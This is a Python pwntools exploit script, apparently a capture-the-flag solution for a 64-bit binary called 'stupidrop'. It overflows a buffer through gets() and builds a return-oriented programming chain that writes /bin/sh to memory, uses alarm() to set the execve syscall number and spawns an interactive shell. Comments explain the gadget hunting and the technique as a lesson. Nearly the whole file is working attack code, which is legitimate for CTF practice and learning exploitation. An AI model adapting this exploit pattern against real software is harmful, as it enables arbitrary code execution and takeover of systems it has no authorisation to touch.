import pwn
import struct

# stupidrop is a 64-bit dynamically linked binary
# NX is enabled, ASLR is on

# This exploit involves using gets() to write /bin/sh to memory
# Using the return value of alarm -> rax to setup a syscall
# and then executing a syscall gadget

# There are two ways to do this exploit.
# One is to setup a standard execve syscall, relying on the fact that rdx happens to be 0x0 already
# the other is to setup a sigreturn syscall, which in turn sets up the standard execve syscall

# Both versions are in this folder
# This is the old-fashioned (non-srop) way

target = pwn.process('./stupidrop')
target_elf = pwn.ELF('stupidrop')

pwn.context.arch = "amd64"

# pop rdi gadget
pop_rdi = struct.pack("<Q", 0x4006a3)

###################################
#### Writing /bin/sh to memory ####
###################################

# Using vmmap, we find 0x601040 is a writeable part of memory filled with just 0s
# This is where we will choose to write /bin/sh
# We will write using the gets plt entry
gets_plt = struct.pack("<Q", target_elf.symbols['gets'])

##############################
#### Getting 0x3b into rax ####
##############################

# We don't have any useable gadgets that will allow us to get a value into rax
# We can look for these with ropper with:
# ropper --file stupidrop --search "% ?ax"
# % means any word. ? means any letter

# We instead, can use the alarm() function, which is called at the start of the binary
# to set the value in rax. return values are stored in rax

# alarm() is used to specify how many seconds to wait before generating a SIGALRM
# It takes an unsigned int specifying the amount of seconds. If we call alarm once, it will set
# the number of seconds (return value will be 0)
# If we call it a second time with an argument of 0, it will cancel the pending alarm and
# return the number of seconds remaining

# So, we will call it once with 0x3b as parameter, 
# and then immediately again with 0x0 as parameter
alarm_plt = struct.pack("<Q", target_elf.symbols['alarm'])

# Syscall gadget:
# ropper --file stupidrop --search "syscall"
# 0x40063e
syscall = struct.pack("<Q", 0x40063e)

####################################
#### Setting up sigreturn frame ####
####################################

# We don't have any good gadgets for changing the value in rdx
# It fortunately is 0x0 as is, so we just do a regular
# execve(0x3b, bin_sh_mem_addr, 0x0, 0x0) syscall

# pop rsi; pop r15; ret; gadget
pop_rsi_pop_r15 = struct.pack("<Q", 0x4006a1)

################################
#### Assembling the Payload ####
################################

payload = b'a' * 56 # distance to return addr control

# '/bin/sh' -> writeable mem (0x601040)
payload += pop_rdi
payload += struct.pack("<Q", 0x601040)
payload += gets_plt

# 0x3b -> rax
payload += pop_rdi
payload += struct.pack("<Q", 0x3b)
payload += alarm_plt
payload += pop_rdi
payload += struct.pack("<Q", 0x0)
payload += alarm_plt

# setting up rdi, rsi
payload += pop_rdi
payload += struct.pack("<Q", 0x601040)
payload += pop_rsi_pop_r15
payload += struct.pack("<Q", 0x0)
payload += struct.pack("<Q", 0x0) # filler for r15

payload += syscall

target.sendline(payload)

target.sendline("/bin/sh") # when our gets plt is executed

target.interactive()